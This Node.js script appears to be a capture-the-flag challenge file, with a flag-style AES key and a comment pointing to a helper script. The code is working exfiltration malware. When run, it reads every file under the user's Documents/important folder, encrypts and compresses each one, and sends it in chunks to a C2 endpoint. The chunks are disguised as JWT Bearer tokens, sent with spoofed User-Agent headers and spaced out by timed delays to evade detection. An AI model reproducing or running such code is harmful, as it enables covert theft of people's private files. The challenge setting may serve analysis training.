
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const http = require('http');

const AES_KEY_TEXT = "itc{oushou_n_takhsayt_??!_YESSSS";
// ask for helper script after you understand the code here.
const C2_HOST = '127.0.0.1';
const C2_PORT = 5000;
const COLLECT_PATH = '/inbox';

const key = Buffer.from(AES_KEY_TEXT, 'utf8');

function encryptAES(plaintext) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

    const input = Buffer.isBuffer(plaintext)
        ? plaintext
        : Buffer.from(plaintext, 'utf8');

    const ciphertext = Buffer.concat([
        cipher.update(input),
        cipher.final()
    ]);

    
    return Buffer.concat([iv, ciphertext]).toString('hex');
}


const PACKET_DELAY_MS = 1000;
const CHUNK_SIZE = 600;  

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendChunkedPayload(
    host, port, requestPath, payload, fileNumber, totalFiles
) {
    const json = JSON.stringify(payload);
    const deflated = require('zlib').deflateSync(json);
    const encoded = deflated.toString('hex');

    const totalChunks = Math.ceil(encoded.length / CHUNK_SIZE);

    for (let chunkIndex = 0; chunkIndex < totalChunks; chunkIndex++) {
        const chunk = encoded.substring(
            chunkIndex * CHUNK_SIZE,
            (chunkIndex + 1) * CHUNK_SIZE
        );

       
        const partLen = Math.ceil(chunk.length / 3);
        const part1 = chunk.substring(0, partLen);
        const part2 = chunk.substring(partLen, partLen * 2);
        const part3 = chunk.substring(partLen * 2); 

      
        const jwtToken = `${part1}.${part2}.${part3}`;

        const options = {
            hostname: host,
            port,
            path: requestPath,
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${jwtToken}`,
                'User-Agent': `Mozilla/5.0 (Windows NT ${fileNumber}.${chunkIndex + 1}; Win64; x64) AppleWebKit/537.36`,
                'Connection': 'close'
            }
        };

        await new Promise((resolve, reject) => {
            const req = http.request(options, response => {
                response.resume();
                response.on('end', () => {
                    if (response.statusCode >= 200 && response.statusCode < 300) {
                        resolve();
                    } else {
                        reject(new Error(`HTTP ${response.statusCode}`));
                    }
                });
            });
            req.on('error', reject);
            req.end();
        });

        if (chunkIndex + 1 < totalChunks) {
            await sleep(PACKET_DELAY_MS);
        }
    }
}

function getAllFiles(dir) {
    let results = [];
    const list = fs.readdirSync(dir);
    for (const item of list) {
        const fullPath = path.join(dir, item);
        const stat = fs.statSync(fullPath);
        if (stat.isDirectory()) {
            results = results.concat(getAllFiles(fullPath));
        } else {
            results.push(fullPath);
        }
    }
    return results;
}
async function performExfiltration() {
    const baseDir = path.join(
        os.homedir(),
        'Documents',
        'important'
    );

    if (!fs.existsSync(baseDir)) {
        return;
    }

    const files = getAllFiles(baseDir);
    const totalFiles = files.length;

    for (let fileIndex = 0; fileIndex < totalFiles; fileIndex++) {
        const filePath = files[fileIndex];
        const fileNumber = fileIndex + 1;

        const fileBuffer = fs.readFileSync(filePath);
        const encryptedB64 = encryptAES(fileBuffer);

        const payload = {
            type: 'document',
            data: encryptedB64,
            sent_at: new Date().toISOString()
        };

        try {
            await sendChunkedPayload(
                C2_HOST,
                C2_PORT,
                COLLECT_PATH,
                payload,
                fileNumber,
                totalFiles
            );

        } catch (error) {
            console.error(error);
        }
    }

}

(async () => {

    if (console.__exfilRunning) {
        return;
    }
    console.__exfilRunning = true;

    try {
        await performExfiltration();
    } catch (err) {
        console.error(err);
    } finally {
        console.__exfilRunning = false;
    }
})();